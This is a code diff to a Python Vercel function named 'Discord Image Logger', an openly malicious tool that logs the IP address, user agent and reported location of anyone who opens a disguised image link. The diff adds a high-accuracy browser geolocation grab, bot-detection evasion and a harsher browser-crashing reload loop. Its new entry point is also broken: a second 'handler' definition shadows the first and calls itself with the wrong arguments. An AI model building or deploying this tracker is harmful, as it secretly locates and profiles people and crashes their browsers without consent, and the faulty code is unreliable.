@@ -2,6 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 import json
+import os
 
 __app__ = "Discord Image Logger"
 __description__ = "a simple image logger"
@@ -178,26 +179,40 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     
     return info
 
-# Vercel serverless function handler
+# Vercel serverless function handler - CORRECTED VERSION
 def handler(request):
     try:
-        # Get IP address from Vercel headers
-        ip = (request.headers.get('x-forwarded-for') or 
-              request.headers.get('x-real-ip') or 
+        # Get headers from Vercel request object
+        headers = request.get('headers', {})
+        
+        # Get IP address
+        ip = (headers.get('x-forwarded-for') or 
+              headers.get('x-real-ip') or 
+              request.get('http_x_forwarded_for') or
               'Unknown')
         
-        # Get user agent
-        useragent = request.headers.get('user-agent', 'Unknown')
+        # Clean IP (remove port if present)
+        if ip and ',' in ip:
+            ip = ip.split(',')[0].strip()
         
-        # Parse query parameters
-        parsed_url = parse.urlparse(request.url)
-        query_params = dict(parse.parse_qsl(parsed_url.query))
+        # Get user agent
+        useragent = headers.get('user-agent', 'Unknown')
+        
+        # Get query parameters
+        query_string = request.get('rawQuery', '') or ''
+        query_params = dict(parse.parse_qsl(query_string))
+        
+        # Get path
+        path = request.get('path', '/')
+        
+        print(f"Request received - IP: {ip}, UA: {useragent}, Path: {path}")  # Debug log
         
         # Get image URL
         if config["imageArgument"]:
             if query_params.get("url") or query_params.get("id"):
                 try:
-                    url = base64.b64decode(query_params.get("url") or query_params.get("id").encode()).decode()
+                    url_param = query_params.get("url") or query_params.get("id")
+                    url = base64.b64decode(url_param.encode()).decode()
                 except:
                     url = config["image"]
             else:
@@ -206,120 +221,165 @@ def handler(request):
             url = config["image"]
         
         # Check if blacklisted
-        if ip and ip != "Unknown" and ip.startswith(blacklistedIPs):
-            return create_response(200, "OK")
+        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
+            return {
+                "statusCode": 200,
+                "headers": {"Content-Type": "text/plain"},
+                "body": "OK"
+            }
         
         # Handle bot detection
-        if botCheck(ip, useragent):
-            makeReport(ip, endpoint=parsed_url.path, url=url)
+        bot_result = botCheck(ip, useragent)
+        if bot_result:
+            print(f"Bot detected: {bot_result}")
+            makeReport(ip, useragent, endpoint=path, url=url)
             
             if config["buggedImage"]:
-                # Return a 1x1 pixel GIF for bugged image
-                return create_response(200, "OK", {
-                    "Content-Type": "image/gif"
-                }, base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"))
+                # Return a 1x1 transparent GIF
+                gif_data = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
+                return {
+                    "statusCode": 200,
+                    "headers": {
+                        "Content-Type": "image/gif",
+                        "Cache-Control": "no-cache, no-store, must-revalidate"
+                    },
+                    "body": base64.b64encode(gif_data).decode('utf-8'),
+                    "isBase64Encoded": True
+                }
             else:
-                return create_response(302, "Redirect", {
-                    "Location": url
-                })
+                return {
+                    "statusCode": 302,
+                    "headers": {
+                        "Location": url
+                    },
+                    "body": ""
+                }
         
         # Handle accurate location
         if query_params.get("g") and config["accurateLocation"]:
             try:
                 location = base64.b64decode(query_params.get("g").encode()).decode()
-                result = makeReport(ip, useragent, location, parsed_url.path, url=url)
+                result = makeReport(ip, useragent, location, path, url=url)
             except:
-                result = makeReport(ip, useragent, endpoint=parsed_url.path, url=url)
+                result = makeReport(ip, useragent, endpoint=path, url=url)
         else:
-            result = makeReport(ip, useragent, endpoint=parsed_url.path, url=url)
-        
-        # Build response HTML
-        message = config["message"]["message"]
-        
-        if config["message"]["richMessage"] and result and isinstance(result, dict):
-            message = message.replace("{ip}", ip)
-            message = message.replace("{isp}", str(result.get("isp", "Unknown")))
-            message = message.replace("{asn}", str(result.get("as", "Unknown")))
-            message = message.replace("{country}", str(result.get("country", "Unknown")))
-            message = message.replace("{region}", str(result.get("regionName", "Unknown")))
-            message = message.replace("{city}", str(result.get("city", "Unknown")))
-            message = message.replace("{lat}", str(result.get("lat", "0")))
-            message = message.replace("{long}", str(result.get("lon", "0")))
-            
-            timezone = result.get("timezone", "Unknown/Unknown")
-            if '/' in timezone:
-                message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
-            else:
-                message = message.replace("{timezone}", "Unknown")
-            
-            message = message.replace("{mobile}", str(result.get("mobile", False)))
-            message = message.replace("{vpn}", str(result.get("proxy", False)))
-            message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
-            
-            os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
-            message = message.replace("{browser}", browser)
-            message = message.replace("{os}", os)
+            result = makeReport(ip, useragent, endpoint=path, url=url)
         
         # Build HTML content
+        html_content = f'''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Logger</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }}
+        div.img {{
+            background-image: url('{url}');
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: contain;
+            width: 100vw;
+            height: 100vh;
+        }}
+    </style>
+</head>
+<body>
+    <div class="img"></div>
+'''
+        
+        # Add message if enabled
         if config["message"]["doMessage"]:
-            html_content = message
-        else:
-            html_content = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''
+            message = config["message"]["message"]
+            if config["message"]["richMessage"] and result and isinstance(result, dict):
+                message = message.replace("{ip}", ip)
+                message = message.replace("{isp}", str(result.get("isp", "Unknown")))
+                message = message.replace("{asn}", str(result.get("as", "Unknown")))
+                message = message.replace("{country}", str(result.get("country", "Unknown")))
+                message = message.replace("{region}", str(result.get("regionName", "Unknown")))
+                message = message.replace("{city}", str(result.get("city", "Unknown")))
+                message = message.replace("{lat}", str(result.get("lat", "0")))
+                message = message.replace("{long}", str(result.get("lon", "0")))
+                
+                timezone = result.get("timezone", "Unknown/Unknown")
+                if '/' in timezone:
+                    message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
+                else:
+                    message = message.replace("{timezone}", "Unknown")
+                
+                message = message.replace("{mobile}", str(result.get("mobile", False)))
+                message = message.replace("{vpn}", str(result.get("proxy", False)))
+                message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
+                
+                os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+                message = message.replace("{browser}", browser)
+                message = message.replace("{os}", os)
+            
+            html_content += f'<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 20px; border-radius: 10px;">{message}</div>'
         
+        # Add crash browser script
         if config["crashBrowser"]:
-            html_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+            html_content += '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i);while(1){location.reload()}}},100)</script>'
         
+        # Add redirect if enabled
         if config["redirect"]["redirect"]:
-            html_content = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
+            html_content += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
         
+        # Add geolocation script
         if config["accurateLocation"]:
             html_content += """<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+(function() {
+    var currenturl = window.location.href;
+    if (!currenturl.includes("g=")) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(coords) {
+                    var separator = currenturl.includes("?") ? "&" : "?";
+                    var locationData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
+                    window.location.href = currenturl + separator + "g=" + encodeURIComponent(locationData);
+                },
+                function(error) {
+                    console.log("Geolocation error:", error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
+            );
+        }
     }
-    location.replace(currenturl);});
-}}
+})();
 </script>"""
         
-        return create_response(200, html_content, {"Content-Type": "text/html"})
+        html_content += '</body></html>'
+        
+        return {
+            "statusCode": 200,
+            "headers": {
+                "Content-Type": "text/html",
+                "Cache-Control": "no-cache, no-store, must-revalidate"
+            },
+            "body": html_content
+        }
     
     except Exception as e:
+        print(f"Error: {traceback.format_exc()}")
         reportError(traceback.format_exc())
-        return create_response(500, "Internal Server Error")
+        return {
+            "statusCode": 500,
+            "headers": {"Content-Type": "text/plain"},
+            "body": f"Internal Server Error: {str(e)}"
+        }
 
-def create_response(status_code, body, headers=None, binary_body=None):
-    """Helper function to create a response for Vercel"""
-    response = {
-        "statusCode": status_code,
-        "headers": headers or {"Content-Type": "text/plain"}
-    }
-    
-    if binary_body:
-        response["body"] = base64.b64encode(binary_body).decode("utf-8")
-        response["isBase64Encoded"] = True
-    else:
-        response["body"] = body
-    
-    return response
+# This is the correct entry point for Vercel Python functions
+def handler(event, context):
+    return handler(event)
 
-# This is the entry point for Vercel
-def main(request):
-    return handler(request)
+# Alternative entry point for different Vercel formats
+def main(event, context):
+    return handler(event)
